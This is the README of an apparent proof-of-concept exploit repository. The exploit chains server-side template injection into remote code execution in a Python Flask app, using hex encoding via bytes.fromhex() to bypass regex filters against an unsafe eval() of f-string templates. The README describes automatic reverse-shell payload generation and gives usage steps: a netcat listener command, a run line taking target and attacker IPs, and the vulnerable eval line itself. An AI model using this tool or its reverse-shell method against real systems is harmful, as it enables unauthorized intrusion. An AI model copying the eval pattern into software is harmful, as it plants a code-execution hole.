# SSTI-to-RCE-Python-Eval-Bypass
A Proof-of-Concept (PoC) exploit demonstrating Server-Side Template Injection (SSTI) in a Python Flask application. The exploit uses hex encoding to bypass strict regex filters and achieve Remote Code Execution (RCE) via an unsafe eval() call in dynamic f-string formatting.


# 🚀 SSTI-to-RCE-Python-Eval-Bypass

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Security](https://img.shields.io/badge/Pentesting-SSTI%20to%20RCE-red?style=for-the-badge)

## 📌 Project Overview
This repository contains a Proof-of-Concept (PoC) exploit for a Server-Side Template Injection (SSTI) vulnerability found in Python-based web applications. 

The exploit targets unsafe usage of the eval() function within f-string templates. It specifically demonstrates how to bypass strict alphanumeric regex filters using Hex Encoding to achieve full Remote Code Execution (RCE).

---

## 🛠️ Key Features
* Filter Bypass: Uses bytes.fromhex() to execute commands without using spaces or special characters blocked by regex.
* Dynamic Payload: Automatically generates a reverse shell payload based on user input.
* Automated Execution: Handles the XML structure and headers required to trigger the vulnerability.
* Lightweight: Built using standard Python libraries (`urllib`, `binascii`).

---

## 🚀 Usage Instructions

### 1. Start Your Listener
Open your terminal and start a netcat listener to catch the reverse shell:
```bash
nc -lvnp 4444


Run the Exploit
Execute the script by providing the target IP, your listener IP, and the port:

python3 exploit.py <TARGET_IP> <YOUR_IP> <YOUR_PORT>

The vulnerability exists because the application takes user input and passes it into a dynamic f-string processed by eval():
# The application insecurely evaluates the template with user input
return eval(f"f'''{user_input_template}'''")
